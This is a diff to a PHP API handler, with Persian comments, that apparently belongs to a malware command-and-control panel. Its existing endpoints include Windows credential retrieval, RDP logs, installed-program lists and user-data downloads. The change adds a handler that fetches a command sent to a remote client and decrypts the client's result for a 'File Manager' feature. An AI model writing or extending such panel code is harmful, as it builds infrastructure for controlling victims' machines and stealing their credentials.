@@ -15,8 +15,9 @@ function handleAPIRequests($pdo, $logged_in)
         'get_rdp_logs',
         'get_installed_programs',
         'get_uploaded_files',
-        'get_windows_credentials', // جدید
-        'get_credential_status',   // جدید
+        'get_windows_credentials',
+        'get_credential_status',
+        'get_command_result', // جدید برای File Manager
         'download_log',
         'download_user_data'
     ];
@@ -662,6 +663,63 @@ function handleAPIRequests($pdo, $logged_in)
 
         logInfo("Debug encryption endpoint accessed", $debug_info);
         echo json_encode($debug_info, JSON_PRETTY_PRINT);
+        exit;
+    }
+
+    // اضافه کردن هندلر جدید برای get_command_result
+    if (isset($_GET['get_command_result'])) {
+        header('Content-Type: application/json; charset=utf-8');
+        if (ob_get_length()) ob_clean();
+
+        try {
+            $commandId = (int)($_GET['command_id'] ?? 0);
+
+            if (!$commandId) {
+                sendJsonError('Command ID required');
+            }
+
+            $stmt = $pdo->prepare("
+            SELECT id, client_id, command, status, result, created_at, completed_at 
+            FROM client_commands 
+            WHERE id = ?
+        ");
+            $stmt->execute([$commandId]);
+            $command = $stmt->fetch();
+
+            if (!$command) {
+                sendJsonError('Command not found');
+            }
+
+            // Try to decrypt the result if it exists
+            $result = null;
+            if ($command['result']) {
+                try {
+                    require_once __DIR__ . '/../../src/Services/EncryptionService.php';
+                    $encryption = new \Services\EncryptionService(new \Services\LoggerService());
+                    $result = $encryption->decrypt($command['result']);
+
+                    // Try to parse as JSON
+                    $decoded = json_decode($result, true);
+                    if (json_last_error() === JSON_ERROR_NONE) {
+                        $result = $decoded;
+                    }
+                } catch (\Exception $e) {
+                    logError("Failed to decrypt command result", $e->getMessage());
+                }
+            }
+
+            echo json_encode([
+                'id' => $command['id'],
+                'client_id' => $command['client_id'],
+                'status' => $command['status'],
+                'result' => $result,
+                'created_at' => $command['created_at'],
+                'completed_at' => $command['completed_at']
+            ], JSON_UNESCAPED_UNICODE);
+        } catch (Exception $e) {
+            logError("get_command_result failed", $e->getMessage());
+            sendJsonError('Failed to get command result: ' . $e->getMessage());
+        }
         exit;
     }
 }
